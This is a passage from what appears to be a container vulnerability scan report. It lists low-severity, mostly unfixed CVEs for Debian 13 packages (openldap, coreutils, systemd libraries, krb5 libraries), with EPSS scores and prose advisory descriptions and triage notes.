<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.346%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

slapd in OpenLDAP 2.4.45 and earlier creates a PID file after dropping privileges to a non-root account, which might allow local users to kill arbitrary processes by leveraging access to this non-root account for PID file modification before a root script executes a "kill `cat /pathname`" command, as demonstrated by openldap-initscript.

---
- openldap <unfixed> (unimportant)
http://www.openldap.org/its/index.cgi?findid=8703
Negligible security impact, but filed #877512

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2015-3276?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2015--3276" src="https://img.shields.io/badge/CVE--2015--3276-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>5.269%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>93rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The nss_parse_ciphers function in libraries/libldap/tls_m.c in OpenLDAP does not properly parse OpenSSL-style multi-keyword mode cipher strings, which might cause a weaker than intended cipher to be used and allow remote attackers to have unspecified impact via unknown vectors.

---
- openldap <unfixed> (unimportant)
Debian builds with GNUTLS, not NSS

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>coreutils</strong> <code>9.7-3</code> (deb)</summary>

<small><code>pkg:deb/debian/coreutils@9.7-3?arch=amd64&distro=debian-13.8</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-56392?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--56392" src="https://img.shields.io/badge/CVE--2026--56392-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.146%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU coreutils unexpand is vulnerable to a heap-based buffer overflow due to an integer overflow during buffer allocation when processing large tab stop (-t) values. The multiplication used to calculate the allocation size can wrap around, resulting in an undersized buffer. When processing crafted input, subsequent writes exceed the allocated memory, leading to an out‑of‑bounds heap write.  When running GNU coreutils unexpand with attacker-provided large tab stop (-t) arguments, this behavior leads to a crash and potentially achieve a heap write primitive depending on memory layout.           This issue has been fixed in the commit b60a159fdc5bfcf9988d3a4cb6f53abe8ad5d35d

---
- coreutils <unfixed> (unimportant)
Fixed by: https://git.savannah.gnu.org/cgit/coreutils.git/commit/?id=b60a159fdc5bfcf9988d3a4cb6f53abe8ad5d35d
https://www.openwall.com/lists/oss-security/2026/07/25/2
Negligible security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-56391?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--56391" src="https://img.shields.io/badge/CVE--2026--56391-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.171%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU coreutils uniq is vulnerable to an out‑of‑bounds read due to incorrect handling of multibyte input when the -w (--check-chars) option is used. The find_field() function miscalculates the byte length of characters by repeatedly processing a fixed pointer instead of advancing through the input, resulting in an inflated length value.  This incorrect length is later used in a memcmp operation, causing reads beyond the allocated buffer when processing crafted multibyte input.  When running GNU coreutils uniq with attacker-provided arguments, this behavior leads to a crash and potential adjacent heap memory exposure.   This issue has been fixed in the commit d64e35a8a4c0e4608321433e0d84d917e4e36371.

---
- coreutils <unfixed> (unimportant)
Fixed by: https://git.savannah.gnu.org/cgit/coreutils.git/commit/?id=d64e35a8a4c0e4608321433e0d84d917e4e36371
https://www.openwall.com/lists/oss-security/2026/07/25/2
Negligible security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-5278?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--5278" src="https://img.shields.io/badge/CVE--2025--5278-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.317%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GNU Coreutils. The sort utility's begfield() function is vulnerable to a heap buffer under-read. The program may access memory outside the allocated buffer if a user runs a crafted command using the traditional key format. A malicious input could lead to a crash or leak sensitive data.

---
- coreutils <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1106733; unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2368764
https://lists.gnu.org/archive/html/bug-coreutils/2025-05/msg00036.html
https://lists.gnu.org/archive/html/bug-coreutils/2025-05/msg00040.html
https://cgit.git.savannah.gnu.org/cgit/coreutils.git/commit/?id=8c9602e3a145e9596dc1a63c6ed67865814b6633
https://www.openwall.com/lists/oss-security/2025/05/27/2
https://debbugs.gnu.org/cgi/bugreport.cgi?bug=78507
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-18018?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2017--18018" src="https://img.shields.io/badge/CVE--2017--18018-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.345%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In GNU Coreutils through 8.29, chown-core.c in chown and chgrp does not prevent replacement of a plain file with a symlink during use of the POSIX "-R -L" options, which allows local users to modify the ownership of arbitrary files by leveraging a race condition.

---
- coreutils <unfixed> (unimportant)
http://lists.gnu.org/archive/html/coreutils/2017-12/msg00045.html
https://www.openwall.com/lists/oss-security/2018/01/04/3
Documentation patches proposed:
https://lists.gnu.org/archive/html/coreutils/2017-12/msg00072.html
https://lists.gnu.org/archive/html/coreutils/2017-12/msg00073.html
Neutralised by kernel hardening

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>libsystemd0</strong> <code>257.13-1~deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/libsystemd0@257.13-1~deb13u1?arch=amd64&distro=debian-13.8&upstream=systemd</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-31439?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2023--31439" src="https://img.shields.io/badge/CVE--2023--31439-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.389%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can modify the contents of past events in a sealed log file and then adjust the file such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31438?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2023--31438" src="https://img.shields.io/badge/CVE--2023--31438-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.362%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can truncate a sealed log file and then resume log sealing such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31437?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2023--31437" src="https://img.shields.io/badge/CVE--2023--31437-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.380%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can modify a sealed log file such that, in some views, not all existing and sealed log messages are displayed. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2013-4392?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2013--4392" src="https://img.shields.io/badge/CVE--2013--4392-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.468%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

systemd, when updating file permissions, allows local users to change the permissions and SELinux security contexts for arbitrary files via a symlink attack on unspecified files.

---
- systemd <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=725357)
[wheezy] - systemd <not-affected> (/etc/tmpfiles.d not supported in Wheezy)
https://bugzilla.redhat.com/show_bug.cgi?id=859060
only relevant to systems running systemd along with selinux

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>libudev1</strong> <code>257.13-1~deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/libudev1@257.13-1~deb13u1?arch=amd64&distro=debian-13.8&upstream=systemd</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-31439?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2023--31439" src="https://img.shields.io/badge/CVE--2023--31439-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.389%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can modify the contents of past events in a sealed log file and then adjust the file such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31438?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2023--31438" src="https://img.shields.io/badge/CVE--2023--31438-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.362%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can truncate a sealed log file and then resume log sealing such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31437?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2023--31437" src="https://img.shields.io/badge/CVE--2023--31437-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.380%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can modify a sealed log file such that, in some views, not all existing and sealed log messages are displayed. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2013-4392?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2013--4392" src="https://img.shields.io/badge/CVE--2013--4392-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.468%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

systemd, when updating file permissions, allows local users to change the permissions and SELinux security contexts for arbitrary files via a symlink attack on unspecified files.

---
- systemd <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=725357)
[wheezy] - systemd <not-affected> (/etc/tmpfiles.d not supported in Wheezy)
https://bugzilla.redhat.com/show_bug.cgi?id=859060
only relevant to systems running systemd along with selinux

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>libkrb5-3</strong> <code>1.21.3-5+deb13u2</code> (deb)</summary>

<small><code>pkg:deb/debian/libkrb5-3@1.21.3-5%2Bdeb13u2?arch=amd64&distro=debian-13.8&upstream=krb5</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-26461?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--26461" src="https://img.shields.io/badge/CVE--2024--26461-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.149%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.

---
- krb5 1.22.1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_2.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d (krb5-1.22-beta1)
Codepath cannot be triggered via API calls, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26458?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--26458" src="https://img.shields.io/badge/CVE--2024--26458-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.822%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.

---
- krb5 1.22.1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_1.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d (krb5-1.22-beta1)
Unused codepath, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-5709?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--5709" src="https://img.shields.io/badge/CVE--2018--5709-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.049%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable "dbentry->n_key_data" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a "u4" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.

---
- krb5 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=889684)
https://github.com/poojamnit/Kerberos-V5-1.16-Vulnerabilities/tree/master/Integer%20Overflow
non-issue, codepath is only run on trusted input, potential integer
overflow is non-issue

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>libgssapi-krb5-2</strong> <code>1.21.3-5+deb13u2</code> (deb)</summary>

<small><code>pkg:deb/debian/libgssapi-krb5-2@1.21.3-5%2Bdeb13u2?arch=amd64&distro=debian-13.8&upstream=krb5</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-26461?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--26461" src="https://img.shields.io/badge/CVE--2024--26461-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.149%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.

---
- krb5 1.22.1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_2.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d (krb5-1.22-beta1)
Codepath cannot be triggered via API calls, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26458?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--26458" src="https://img.shields.io/badge/CVE--2024--26458-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.822%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.

---
- krb5 1.22.1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_1.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d (krb5-1.22-beta1)
Unused codepath, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-5709?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--5709" src="https://img.shields.io/badge/CVE--2018--5709-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.049%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable "dbentry->n_key_data" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a "u4" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.

---
- krb5 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=889684)
https://github.com/poojamnit/Kerberos-V5-1.16-Vulnerabilities/tree/master/Integer%20Overflow
non-issue, codepath is only run on trusted input, potential integer
overflow is non-issue

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>libkrb5support0</strong> <code>1.21.3-5+deb13u2</code> (deb)</summary>

<small><code>pkg:deb/debian/libkrb5support0@1.21.3-5%2Bdeb13u2?arch=amd64&distro=debian-13.8&upstream=krb5</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-26461?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--26461" src="https://img.shields.io/badge/CVE--2024--26461-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.149%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.

---
- krb5 1.22.1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_2.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d (krb5-1.22-beta1)
Codepath cannot be triggered via API calls, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26458?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--26458" src="https://img.shields.io/badge/CVE--2024--26458-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.822%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.

---
- krb5 1.22.1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_1.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d (krb5-1.22-beta1)
Unused codepath, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-5709?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--5709" src="https://img.shields.io/badge/CVE--2018--5709-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.049%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable "dbentry->n_key_data" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a "u4" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.

---
- krb5 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=889684)
https://github.com/poojamnit/Kerberos-V5-1.16-Vulnerabilities/tree/master/Integer%20Overflow
non-issue, codepath is only run on trusted input, potential integer
overflow is non-issue

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>libk5crypto3</strong> <code>1.21.3-5+deb13u2</code> (deb)</summary>

<small><code>pkg:deb/debian/libk5crypto3@1.21.3-5%2Bdeb13u2?arch=amd64&distro=debian-13.8&upstream=krb5</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-26461?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--26461" src="https://img.shields.io/badge/CVE--2024--26461-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.149%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.

---
- krb5 1.22.1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_2.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d (krb5-1.22-beta1)
Codepath cannot be triggered via API calls, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

